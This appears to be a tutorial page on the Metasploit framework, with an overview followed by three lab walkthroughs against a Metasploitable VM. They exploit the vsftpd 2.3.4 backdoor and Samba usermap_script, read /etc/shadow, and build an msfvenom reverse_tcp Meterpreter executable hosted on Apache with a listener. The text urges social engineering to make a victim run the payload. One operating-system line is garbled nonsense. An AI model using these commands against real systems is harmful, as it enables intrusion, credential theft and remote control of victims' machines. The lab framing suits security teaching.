~ The world’s most used penetration testing framework~
Knowledge has enormous power, particularly when it is shared. Metasploit, a collaboration between the open source community and Rapid7, helps security teams do more than just verify vulnerabilities, manage security assessments, and raise security awareness; it empowers and arms defenders to stay one step (or two) ahead of the game at all times.
What is Metasploit?
The Metasploit Framework is a modular, Ruby-based penetration testing platform that lets you develop, test, and run exploit code. You may use the Metasploit Framework to test security vulnerabilities, enumerate networks, conduct attacks, and elude detection. The Metasploit Framework is, at its core, a set of widely used tools that provide a full environment for penetration testing and exploit creation.
Who Uses Metasploit?
Metasploit is utilized by everyone from DevSecOps pros to hackers because of its vast range of uses and open-source availability. It’s useful for everyone who requires a simple to use, dependable solution that gets the job done regardless of platform or language. Because the program is popular among hackers and is freely available, security experts should get familiar with it even if they don't use it.
  • Metasploit currently has 1677 vulnerabilities spread across 25 platforms, including Android, PHP, Python, Java, Cisco, and others.
    Nearly 500 payloads are carried by the framework, some of which include:
  • Command shell payloads, which let users to run scripts or arbitrary commands against a host.
  • Dynamic payloads, which enable testers to produce new payloads to dodge antivirus protection.
  • Meterpreter payloads, which allow users to takeover device monitors via VMC and take over sessions or upload and download data
  • Static payloads, which enable port forwarding and network communications

Metasploit modules

There are a few types of modules. The module type depends on the purpose of the module and the type of action that the module performs. The image to the left sates some module types that are available in the Metasploit Framework

More details

How to Get Metasploit

Metasploit may be downloaded from the Rapid7 website using open-source installers. The following are the minimum system requirements, in addition to the current versions of Chrome, Firefox, and Explorer.

Operating Systems:

  • Ubuntu Linux 14.04 or 16.04 LTS (recommended)
  • Windows Server 2008 or 2012 R2
  • Windows 7 SP1+, 8.1, or 10
  • Locatjkhs kkj knkjen
  • Red Hat Enterprise Linux Server 5.10, 6.5, 7.1, or later

Hardware:

  • 2 GHz+ processor
  • Minimum 4 GB RAM, but 8 GB is recommended
  • Minimum 1 GB disk space, but 50 GB is recommended
View tutorial





Accessing MSFconsole

  • 1

    MSFconsole is a command line interface that allows you to access and operate with the Metasploit Framework. The MSFconsole is the most frequent interface for interacting with the Metasploit Framework. You may use the console to scan targets, exploit vulnerabilities, and gather data.

  • 2

    Getting Help for MSFconsole Commands

    To view help while you are in the console, use the following commands:
    o Type help to display a list of valid commands for the current mode. While you are in the main mode, the system displays help for the global commands that are available. When you are in the module mode, the system displays the help for the commands and options that are available for the module.
    o Type info *module name* to view the options for a module.

    Overview Video

  • 4

    Scenarios

    We will show you some demonstrations on how you can utilize Metasploit practically
    Software required : Metasploit & VMWare Player
    Setup : Install VMWare Player (If not installed) & Create two Virtual Machines using VMWare Player.
    One VM with Metasploit installed and the other VM as the target machine

Scenario 1 – Use NMAP to scan for vulnerabilities and metasploit to test a metasploitable OS - VSFTPD 2.3.4

Used: VMWare, Nmap, Msfconsole
Attacker – Kali Linux
Victim – Metasploitable Linux
Steps…
Using NMAP – to scan for vulnerabilities
EXAMPLE: nmap –sn 192.168.0.0/24
This will list all scan reports for available devices on network
Note: Nmap comes with pre-existing scripts you can run to perform vulnerability scans on specific devices

"Type>>> cd /usr/share/nmap/scripts
Steps…
Type>>> nmap 192.168.106.134 in kali Linux terminal
 Or nmap –sV -O 192.168.106.134
o - sV is to get the version of available network processes and -O is to get the operating systems
 Available open ports will be listed. You can see all open ports below and their versions that can be vulnerable to certain exploits
 Open metasploit >>> msfconsole
 In metasploit,
o show exploits
o search vsftpd #to_find_the_exploit_associated_with_vsfpd
o use exploit/unix/ftp/vsftpd_234_backdoor #exploit_chosen
o show options #to_check_available_parameters
o set RHOSTS 192.168.106.134 #your victim machine
o exploit
o You can type ‘help’ to see available post exploitation commands

Scenario 2 – Use NMAP to scan for vulnerabilities and metasploit to test a metasploitable OS – SAMBA exploit

Used: VMWare
Attacker – Kali Linux
Victim – Metasploitable Linux
Steps…
Using NMAP – to scan for vulnerabilities
EXAMPLE: nmap –sn 192.168.0.0/24
This will list all scan reports for available devices on network
Note: Nmap comes with pre-existing scripts you can run to perform vulnerability scans on specific devices
Type>>> cd /usr/share/nmap/scripts

Steps…
 Type nmap 192.168.106.134 in kali Linux terminal
 Or nmap –sV -O 192.168.106.134
o - sV is to get the version of available network processes and -O is to get the operating systems
 Available open ports will be listed
 Or you can use the tool called NESSUS for a more detailed scan
 Open metasploit >>> msfconsole
 In metasploit
o use auxiliary/scanner/smb/smb_version
o show options
o set RHOSTS 192.168.106.134 #IP_for_metasploitable_machine
o run #to_find_the_exploit_associated_with_samba
o use exploit/multi/samba/usermap_script
o show options
o set RHOST 192.168.106.134
o exploit
- At this point you are in the machine
- You can use>>
- ls –la to list the folders and files
- cat /etc/shadow to list the usernames and encrypted passwords
- cat /etc/passwd to list the usernames and passwords
- You can use other tools to crack the passwords

Scenario 3- Using msfvenom to create payload.

<< Script >> in kali root terminal, type the following...
 msfvenom –l payload
#this_script_will_list_all_available_usable_payloads_that_can_be_created...we_go_with_the_following_windows_one
 msfvenom -p windows/meterpreter/reverse_tcp lhost=*HOST/attacker_IP> lport=*PORT_NUMBER> -f exe -o *title_of_file>.exe
#connect_back_to_attacker_and_spawn_a_Meterpreter shell

" msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.106.130 lport=8080 -f exe -o backpayload.exe
 A .exe file will then be created, and stored – this is our payload
 Move or copy the file to the following directory /var/www/html
o The reason being, we are going to use the Apache2 Web Server as our tunnel
 Type the following script service apache2 start to start the Apache server, you can also run service apache2 status to check if it is up and running
 Start the metaspoilt framework with the following script, to set up listener
o service postgresql start
o msfconsole
 In the framework(not in root), type the following,
o use multi/handler
o set payload windows/meterpreter/reverse_tcp
o set lhost 192.168.106.130
o set lport 8080
o show options
o exploit
 From this point, your machine will be listening for any incoming traffic. You then have to figure out how you can perform a social engineering attack to get your victim to download and run the executable file from this link http://192.168.106.130/backpayload.exe
 Once the file has been downladed and executed, your machine will receive traffic and you practically now have access to the victim’s machine
 You can type help to see all commands you can perform
*FOR EXAMPLE* ifconfig, screenshot, reboot
